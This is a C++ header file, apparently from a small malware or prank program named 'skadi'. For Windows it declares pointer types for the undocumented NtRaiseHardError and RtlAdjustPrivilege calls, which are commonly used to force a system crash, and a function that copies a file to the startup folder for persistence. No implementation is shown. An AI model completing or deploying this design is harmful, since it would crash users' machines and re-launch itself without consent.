#pragma once

#include <stdlib.h>
#include <string.h>
#include <iostream>

#ifdef __linux__

#include <unistd.h>
void linux_skadi();

#elif _WIN32

#include <windows.h>
#include <windef.h>
#include <tchar.h>
#include <shlobj.h>
#include <wchar.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <Shlwapi.h>
#include <shellAPI.h>

#pragma comment(lib,"Shlwapi.lib")

typedef NTSTATUS(NTAPI *pdef_NtRaiseHardError)(NTSTATUS ErrorStatus, ULONG NumberOfParameters, ULONG UnicodeStringParameterMask OPTIONAL, PULONG_PTR Parameters, ULONG ResponseOption, PULONG Response);
typedef NTSTATUS(NTAPI *pdef_RtlAdjustPrivilege)(ULONG Privilege, BOOLEAN Enable, BOOLEAN CurrentThread, PBOOLEAN Enabled);

bool FileExists(std::wstring fileName);
void copyFileToStartUp();
void windows_skadi();

#endif
